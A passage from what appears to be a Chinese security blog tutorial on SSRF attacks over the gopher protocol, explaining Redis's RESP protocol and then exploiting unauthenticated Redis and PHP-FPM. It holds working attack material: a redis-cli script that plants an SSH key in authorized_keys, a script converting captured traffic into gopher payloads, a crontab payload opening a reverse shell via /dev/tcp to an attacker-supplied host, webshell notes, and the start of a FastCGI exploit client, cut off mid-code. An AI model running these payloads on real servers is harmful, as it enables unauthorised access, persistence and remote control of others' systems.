Strings</code>，回复的第一个字节是<code>+</code></li><li>对于<code>error</code>，回复的第一个字节是<code>-</code></li><li>对于<code>Integer</code>，回复的第一个字节是<code>:</code></li><li>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code></li><li>对于<code>array</code>，回复的第一个字节是<code>*</code></li></ul><p>此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。<br>在RESP中，协议的不同部分始终以”\r\n”(CRLF)结束。</p><p>抓包具体分析看一下<br>redis执行：</p><pre><code>127.0.0.1:6379&gt; set tetst teaOK127.0.0.1:6379&gt; get tetst&quot;tea&quot;127.0.0.1:6379&gt; </code></pre><p>看数据包<br><img src="/3983147628/4.png" alt></p><p>正如前面说的，客户端向将命令作为Bulk Strings的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。应该是按照空格进行划分的，所以是三个数组<code>*3</code>然后就是3个字符长度<code>$3</code>,+ok则是执行成功的意思，然后再就是<code>协议的不同部分始终以&quot;\r\n&quot;(CRLF)结束</code>看hex格式<br><img src="/3983147628/5.png" alt><br>每个命令之间都会有一个<code>0d0a</code>，意思就是<code>\r\n</code>代表结束</p><p>了解完Redis数据库后，攻击利用就很容易理解了</p><h3 id="5-3-利用redis写入ssh-keygen公钥"><a href="#5-3-利用redis写入ssh-keygen公钥" class="headerlink" title="5.3 利用redis写入ssh-keygen公钥"></a>5.3 利用redis写入ssh-keygen公钥</h3><p>原理就是将redis数据库备份到存储公钥的文件中（~/.ssh/authorized_keys）<img src="https://zhuanlan.zhihu.com/p/28423720" alt="SSH 免密登录"><br>具体步骤是：</p><ol><li>在本地生成一对密匙<br><code>ssh-keygen -t rsa</code></li><li>然后将公钥写入到一个文件中<br><code>(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;)&gt;key.txt</code></li><li>再利用redis将文件中的公钥写入redis服务器上的<code>~/.ssh/authorized_keys</code>中</li><li>然后ssh免密登录</li></ol><p>下面直接进行操作<br>创建密匙,并写入文件<br><img src="/3983147628/6.png" alt><br><img src="/3983147628/7.png" alt></p><p>接下来就是利用redis把文件写入到服务器上，这时候我们就需要伪造请求，然后改成gopher格式。<br>先做个端口转发获取redis的请求流量（用ftpdump也可以，但是要一条一条的输入，不然会抓取不到，有点麻烦）</p><pre><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></pre><p>这时候我们请求4444端口就会把流量转发给6379</p><pre><code>//redis.sh    cat /root/.ssh/key.txt|redis-cli -h $1 -p $2 -x set 1 flushallredis-cli -h $1 -p $2 config set dir /root/.ssh/redis-cli -h $1 -p $2 config set dbfilename authorized_keysredis-cli -h $1 -p $2 save   redis-cli -h $1 -p $2 quit</code></pre><p>执行<code>./redis.sh 127.0.0.1 4444</code><br>socat会把流量都打印出来<br><img src="/3983147628/8.png" alt></p><p>需要把数据按照RESP格式处理好，然后转成gopher请求的格式<br>RESP转换规则如下：</p><ul><li>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li><li>将\r字符串替换成%0d%0a</li><li>空白行替换为%0a</li></ul><p>直接附上JoyChou师傅的脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding: utf-8</span><span class="token comment" spellcheck="true">#author: JoyChou</span><span class="token keyword">import</span> sysexp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> open<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token string">'>&lt;+'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token comment" spellcheck="true"># 判断倒数第2、3字符串是否为\r</span>        <span class="token keyword">elif</span> line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token string">'\r'</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 如果该行只有\r，将\r替换成%0a%0d%0a</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> <span class="token string">'%0a%0d%0a'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>r<span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'%0d%0a'</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 去掉最后的换行符</span>                line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> line        <span class="token comment" spellcheck="true"># 判断是否是空行，空行替换为%0a</span>        <span class="token keyword">elif</span> line <span class="token operator">==</span> <span class="token string">'\x0a'</span><span class="token punctuation">:</span>            exp <span class="token operator">=</span> exp <span class="token operator">+</span> <span class="token string">'%0a'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            exp <span class="token operator">=</span> exp <span class="token operator">+</span> line<span class="token keyword">print</span> exp</code></pre><p><img src="/3983147628/9.png" alt><br>突然发现有错误，忘记再靶机上创建文件了，必须要保证脚本全部执行成功才能抓取到正确的流量。同时也要保证各个文件的数据都再。踩得坑……<br><img src="/3983147628/10.png" alt><br>现在的payload正常了，然后执行<br><img src="/3983147628/11.png" alt><br><img src="/3983147628/12.png" alt><br>话说最好还是flushall一下，不然有其他乱起八糟的，不知道这样能不能用……</p><h3 id="5-4-利用contrab计划任务反弹shell"><a href="#5-4-利用contrab计划任务反弹shell" class="headerlink" title="5.4 利用contrab计划任务反弹shell"></a>5.4 利用contrab计划任务反弹shell</h3><p>linux⾃带cron服 务，这个服务每隔⼀段时间会⾃动扫描相应的⽂件夹，查看下⾯是否有新增的⽂件，若有则 当作crontab脚本解析。而crontab是linux中的⼀种定时服务。这里主要学习下crontab，感觉可以用来留后门啥的……<br>crontab的文件格式：</p><pre><code>第1列分钟0～59第2列小时0～23（0表示子夜）第3列日1～31第4列月1～12第5列星期0～7（0和7表示星期天）第6列要运行的命令*****[command]--》这个表示每一分钟执行一次命令</code></pre><p>主要看一下ubuntu和centos，ubuntu是不能利用的，原因：</p><ol><li>为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是-rw——-才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li><li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ol><p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）/etc/crontab ，所以脚本最好都用root用户，若是文件名和系统中的用户都不符合就会报错。<br>PS：高版本的redis默认启动是redis权限，redis权限基本什么都干不了，故写这个文件是行不通的</p><p>具体的下面这篇文章介绍了：<br><img src="https://joychou.org/web/hackredis-enhanced-edition-script.html" alt></p><p>原理都一样，只不过是写入的文件夹不一样。就不演示了，流程一样，只不过要改一下路径，</p><pre><code>//redis.shecho -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/$3/23333 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><h3 id="5-5-利用redis写入webshell"><a href="#5-5-利用redis写入webshell" class="headerlink" title="5.5 利用redis写入webshell"></a>5.5 利用redis写入webshell</h3><p>改脚本和路径可。需要注意的是就是要知道绝对路径，以及要有写权限。同时现在大多站库分离……so……</p><h2 id="0x06-gopher攻击认证Redis"><a href="#0x06-gopher攻击认证Redis" class="headerlink" title="0x06 gopher攻击认证Redis"></a>0x06 gopher攻击认证Redis</h2><p>划重点，大多的攻击都是基于未授权的，很少有认证的攻击。而redis却可以。<br>主要原因如下：</p><blockquote><p>Redis客户端支持管道操作，可以通过单个写入操作发送多个命令，而无需在发出下一个命令之前读取上一个命令的服务器回复。所有的回复都可以在最后阅读</p></blockquote><p>正常应该是这样的一个流程：认证成功然后执行命令。是要一步一步来的，但是redis却可以认证成功在一起执行。或说有点理解不了这种逻辑。这样我们就可以把密码放到payload中，如果密码正确，后面的命令就会被执行。同时也可以进行弱口令爆破<br>redis密码命令<br><code>AUTH passwd</code></p><h2 id="0x07-Gopher攻击PHP-FPM"><a href="#0x07-Gopher攻击PHP-FPM" class="headerlink" title="0x07 Gopher攻击PHP-FPM"></a>0x07 Gopher攻击PHP-FPM</h2><p>直接附上P神的关于Fastcgi协议分析的文章，很详细。<br><img src="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" alt><br>画个图概括一下：<br>浏览器——&gt;服务器中间件——&gt;后端语言<br>第一个<code>——&gt;</code>可以成是HTTP协议，构成了浏览器到服务器中间的桥，而第二座桥就是fastcgi协议<br>再就是PHP-FRM（FastCGI进程管理器）</p><blockquote><p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。<br>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p></blockquote><p>P神文章中也有提到PHP-FRM的未授权，PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。但是正常情况下，一般都会和127.0.0.1进行绑定。这就是 ssrf做的了，思路还是那个思路，只不过利用ssrf这个跳板绕过了127.0.0.1的限定。</p><p>直接上脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">import</span> argparse<span class="token keyword">import</span> sys<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> urllib<span class="token comment" spellcheck="true"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span>PY2 <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">.</span>major <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">bchr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> PY2<span class="token punctuation">:</span>        <span class="token keyword">return</span> force_bytes<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>c<span class="token punctuation">,</span> int<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> c    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>s<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> issubclass<span class="token punctuation">(</span>type<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>s<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">class</span> <span class="token class-name">FastCGIClient</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A Fast-CGI Client for Python"""</span>    <span class="token comment" spellcheck="true"># private</span>    __FCGI_VERSION <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_RESPONDER <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_AUTHORIZER <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_ROLE_FILTER <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_BEGIN <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_TYPE_ABORT <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_TYPE_END <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_PARAMS <span class="token operator">=</span> <span class="token number">4</span>    __FCGI_TYPE_STDIN <span class="token operator">=</span> <span class="token number">5</span>    __FCGI_TYPE_STDOUT <span class="token operator">=</span> <span class="token number">6</span>    __FCGI_TYPE_STDERR <span class="token operator">=</span> <span class="token number">7</span>    __FCGI_TYPE_DATA <span class="token operator">=</span> <span class="token number">8</span>    __FCGI_TYPE_GETVALUES <span class="token operator">=</span> <span class="token number">9</span>    __FCGI_TYPE_GETVALUES_RESULT <span class="token operator">=</span> <span class="token number">10</span>    __FCGI_TYPE_UNKOWNTYPE <span class="token operator">=</span> <span class="token number">11</span>    __FCGI_HEADER_SIZE <span class="token operator">=</span> <span class="token number">8</span>    <span class="token comment" spellcheck="true"># request state</span>    FCGI_STATE_SEND <span class="token operator">=</span> <span class="token number">1</span>    FCGI_STATE_ERROR <span class="token operator">=</span> <span class="token number">2</span>    FCGI_STATE_SUCCESS <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> keepalive<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host        self<span class="token punctuation">.</span>port <span class="token operator">=</span> port        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout        <span class="token keyword">if</span> keepalive<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> None        self<span class="token punctuation">.</span>requests <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__connect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># if self.keepalive:</span>        <span class="token comment" spellcheck="true">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>        <span class="token comment" spellcheck="true"># else:</span>        <span class="token comment" spellcheck="true">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>sock <span class="token operator">=</span> None            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">__encodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fcgi_type<span class="token punctuation">,</span> content<span class="token punctuation">,</span> requestid<span class="token punctuation">)</span><span class="token punctuation">:</span>        length <span class="token operator">=</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        buf <span class="token operator">=</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_VERSION<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>fcgi_type<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>requestid <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>requestid <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>length <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> content        <span class="token keyword">return</span> buf    <span class="token keyword">def</span> <span class="token function">__encodeNameValueParams</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        nLen <span class="token operator">=</span> len<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        vLen <span class="token operator">=</span> len<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        record <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">if</span> nLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>nLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>nLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> vLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>vLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>vLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> record <span class="token operator">+</span> name <span class="token operator">+</span> value    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIHeader</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> header    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__FCGI_HEADER_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> header<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIHeader<span class="token punctuation">(</span>header<span class="token punctuation">)</span>            record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">''</span>            <span class="token keyword">if</span> <span class="token string">'contentLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                contentLength <span class="token operator">=</span> int<span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>contentLength<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'paddingLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                skiped <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>int<span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> record    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nameValuePairs<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> post<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true"># if not self.__connect():</span>        <span class="token comment" spellcheck="true">#    print('connect failure! please check your fasctcgi-server !!')</span>         <span class="token comment" spellcheck="true">#   return</span>        requestId <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span> <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> b<span class="token string">""</span>        beginFCGIRecordContent <span class="token operator">=</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_ROLE_RESPONDER<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>keepalive<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_BEGIN<span class="token punctuation">,</span>                                              beginFCGIRecordContent<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        paramsRecord <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">if</span> nameValuePairs<span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> nameValuePairs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                name <span class="token operator">=</span> force_bytes<span class="token 